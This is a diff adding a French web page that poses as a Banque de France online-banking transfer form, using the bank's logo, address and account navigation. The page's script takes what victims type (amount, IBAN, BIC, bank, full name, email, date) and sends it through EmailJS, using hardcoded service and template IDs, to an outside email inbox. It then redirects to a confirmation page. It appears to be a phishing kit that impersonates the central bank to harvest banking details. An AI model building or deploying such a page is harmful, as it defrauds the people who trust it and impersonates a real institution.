@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Effectuer un Virement Bancaire</title>
+  <link rel="stylesheet" href="styles.css">
+  <script src="shared.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+  <script>
+    emailjs.init("FKs6sTJ_HNaf3uyOd");
+
+    function sendEmail(event) {
+      event.preventDefault();
+      const form = event.target;
+      const formData = new FormData(form);
+      const params = new URLSearchParams();
+      for (const pair of formData.entries()) params.append(pair[0], pair[1]);
+
+      emailjs.sendForm("service_spy84gt", "template_4uu9u0a", form)
+        .then(() => {
+          window.location.href = "confirmation.html?" + params.toString();
+        })
+        .catch(error => {
+          alert("❌ Une erreur est survenue : " + JSON.stringify(error));
+        });
+    }
+  </script>
+
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #f5f7fa, #e0e6ed);
+      margin: 0;
+      padding: 0;
+    }
+    header {
+      background-color: #003366;
+      color: white;
+      padding: 15px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .user-info {
+      font-size: 0.9em;
+    }
+    nav {
+      background-color: #e0e6ed;
+      padding: 10px;
+      display: flex;
+      gap: 20px;
+      font-weight: bold;
+    }
+    nav a {
+      text-decoration: none;
+      color: #003366;
+    }
+    main {
+      display: flex;
+      padding: 30px;
+      gap: 40px;
+    }
+    .left-panel {
+      flex: 2;
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      animation: fadeIn 0.8s ease;
+    }
+    .left-panel h2 {
+      color: #003366;
+    }
+    form label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+      color: #003366;
+    }
+    form input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      transition: border-color 0.3s;
+    }
+    form input:focus {
+      border-color: #003366;
+      outline: none;
+    }
+    button[type="submit"] {
+      margin-top: 25px;
+      padding: 12px 20px;
+      background-color: #003366;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 1em;
+      transition: background-color 0.3s;
+    }
+    button[type="submit"]:hover {
+      background-color: #0055aa;
+    }
+    .right-panel {
+      flex: 1;
+    }
+    .right-panel button {
+      display: block;
+      width: 100%;
+      margin-bottom: 10px;
+      padding: 10px;
+      background-color: #003366;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+<header>
+  <div class="user-info"><img src=https://upload.wikimedia.org/wikipedia/commons/thumb/6/65/Banque_de_France_Logo.svg/1280px-Banque_de_France_Logo.svg.png height=85 width=155>
+    <span id="user-name">Bienvenue</span><br>
+    <span id="last-conn">Dernière connexion : </span>
+  </div>
+  <div>
+    <strong>Solde : <span id="user-solde">...</span></strong>
+    <a href="index.html" class="status">Se déconnecter</a>
+  </div>
+</header>
+
+<nav>
+  <a href="dashboard.html">VOS COMPTES ET PRODUITS</a>
+  <a href="historique.html">OPÉRATIONS COURANTES</a>
+  <a href="#">S'INFORMER OU SOUSCRIRE</a>
+</nav>
+
+<main>
+  <div class="left-panel">
+    <h2>💸 Effectuer un Virement Bancaire</h2>
+    <p>Remplissez ce petit formulaire pour envoyer votre virement en toute sérénité 😊</p>
+
+    <form onsubmit="sendEmail(event)">
+      <label>Montant (€)</label>
+      <input type="number" name="montant" placeholder="Ex : 1000" required /><br>
+
+      <label>Motif</label>
+      <input type="text" name="motif" placeholder="Ex : Paiement facture" required /><br>
+
+      <label>IBAN</label>
+      <input type="text" name="iban" placeholder="FR76 XXXX XXXX XXXX XXXX XXXX XXX" required /><br>
+
+      <label>BIC</label>
+      <input type="text" name="bic" placeholder="Ex : BNPAFRPPXXX" required /><br>
+
+      <label>Domiciliation</label>
+      <input type="text" name="domiciliation" placeholder="Nom de la banque" required /><br>
+
+      <label>Nom et Prénom</label>
+      <input type="text" name="user_name" placeholder="Ex : Jean Dupont" required /><br>
+
+      <label>Email</label>
+      <input type="email" name="user_email" placeholder="votre@email.com" required /><br>
+
+      <label>Date</label>
+      <input type="date" name="date" required /><br>
+
+      <button type="submit">✅ Envoyer le virement</button>
+    </form>
+  </div>
+
+  <div class="right-panel">
+    <button onclick="location.href='dashboard.html'">SYNTHÈSE DES COMPTES</button>
+    <button onclick="location.href='historique.html'">HISTORIQUE DES OPÉRATIONS</button>
+    <button onclick="location.href='rib.html'">IMPRIMER UN RIB</button>
+	<button onclick="location.href='profil.html'">PROFIL</button>
+    <button onclick="location.href='virement.html'">FAIRE UN VIREMENT</button>
+    <button onclick="alert('Espace sécurisé')">VOTRE ESPACE SÉCURISÉ</button>
+  </div>
+</main>
+<footer>
+  <p>© BANQUE DE FRANCE - 39 Rue Croix des Petits Champs, 75001 Paris, France</p>
+</footer>
+
+<script type="module">
+  import { checkAuth, formatCurrency } from './shared.js';
+
+  document.addEventListener('DOMContentLoaded', () => {
+    const currentUser = checkAuth();
+    if (!currentUser) return;
+    document.getElementById('user-name').textContent = `Bienvenue ${currentUser.name}`;
+    document.getElementById('last-conn').textContent = `Dernière connexion le ${currentUser.lastConnection}`;
+    document.getElementById('user-solde').textContent = formatCurrency(currentUser.solde);
+  });
+</script>
+</body>
+</html>
